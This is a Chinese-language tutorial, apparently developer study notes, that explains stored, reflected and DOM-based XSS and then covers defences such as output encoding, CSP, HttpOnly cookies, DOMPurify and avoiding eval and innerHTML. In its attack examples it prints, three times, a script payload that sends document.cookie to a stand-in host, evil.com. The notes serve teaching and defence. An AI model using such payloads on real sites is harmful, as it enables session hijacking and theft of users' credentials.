## XSS（跨站脚本攻击）


### 存储型 XSS（Stored XSS）


#### 步骤：

1. **提交带脚本的内容**
    - 比如在网站的评论、昵称、签名、文章等输入框中输入恶意脚本：

```
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

2. **服务端没有进行过滤与转义**
    - 直接存入数据库，下一次页面渲染时会原样输出到 HTML 页面中。
3. **用户访问该内容页面**
    - 浏览器解析页面时执行 `<script>`，从而泄露信息。

#### 示例：

用户访问页面时看到的内容是：

```
<p>黑客的评论：</p> 
<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
```

用户的 `document.cookie` 被发送给黑客控制的服务器。
### 反射型 XSS（Reflected XSS）
#### 步骤：

1. 比如构造一个**带脚本的 URL**，例如
    `https://abc.com/search?q=<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>`
2. **abc.com 的搜索功能页面会将参数 `q` 直接插入到 HTML 中**，比如：
    `你搜索了：<div id="result">${q}</div>`
3. 诱导用户点击这个链接（比如在钓鱼邮件、评论、微信发链接）。
4. 用户点击后访问该地址，浏览器解析并执行注入的 `<script>`，泄露信息。

### DOM 型 XSS（DOM-based XSS）

恶意代码**不经过服务器处理**，而是通过前端 JavaScript 操作 DOM 导致执行。

```
// 页面脚本：将 URL 中参数直接插入页面
document.getElementById('output').innerHTML = location.search;

// 用户访问
?msg=<script>alert('xss')</script>
```

### XSS攻击的目的

- 窃取 Cookie，获取用户身份认证信息
    
- 伪造用户行为（如转账、点赞）
    
- 注入广告、钓鱼链接
    
- 绕过 CSRF 防御等手段

## 如何防御 XSS

#### 1. 输入过滤 + 输出编码

输入过滤：

过滤掉明显危险的字符：如 `<script>`, `<img onerror=...>` 等
注意不能仅靠黑名单，容易绕过。

输出编码（重要）：

| 场景         | 防御方式                   |
| ---------- | ---------------------- |
| HTML 标签中内容 | 转义 `< > & " '` 等字符     |
| 属性中        | 使用属性值时转义 `"` `'`       |
| JS 中       | 严禁拼接脚本代码，使用 JSON 编码    |
| URL 中      | `encodeURIComponent()` |

**推荐工具：**

- 前端：`DOMPurify`、`xss` 库
- 后端（Node.js）：`xss-filters`、`helmet`

#### 2. 使用 CSP（内容安全策略）

限制页面可以加载的资源，防止注入脚本执行。

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

#### 3. HttpOnly + Secure 设置 Cookie

防止通过 JavaScript 获取 Cookie 信息。

```
Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict
```

#### 4. 使用框架内建的防御机制

- React 默认对 JSX 中插值内容进行转义
- Vue 自动转义插值表达式
- 不要使用 `v-html`、`dangerouslySetInnerHTML` 除非特别谨慎

#### 备注：

##### vue或react中如果要使用富文本，可以使用dompurify库先转换

```
npm install dompurify
```

```
import DOMPurify from 'dompurify';

export default {
  computed: {
    safeHtml() {
      return DOMPurify.sanitize(this.content);
    },
  },
};
```

```
<div v-html="safeHtml"></div>
```

##### 如果只是显示文本（不需要 HTML），直接插值：

```
<p>{{ content }}</p> <!-- 自动转义 -->
```

##### 安全用法的 `setTimeout`

不安全的：

```
const userInput = "alert('XSS')";
setTimeout(userInput, 1000); //  会执行 alert('XSS')
```

安全写法：

```
//  正确写法：传入函数，不传字符串
setTimeout(() => {
  console.log("安全执行");
}, 1000);
```


##### 禁止使用 new Function()

不安全的：

```
new Function(userInput)(); //  也会执行 alert('XSS')
```

##### 不要在标签上添加事件

危险写法：

```
<div onclick="...">
```

应该使用 `addEventListener` / `@click` 

##### 不使用 innerHTML，eval()，

可以使用 textContent, appendChild 相对安全
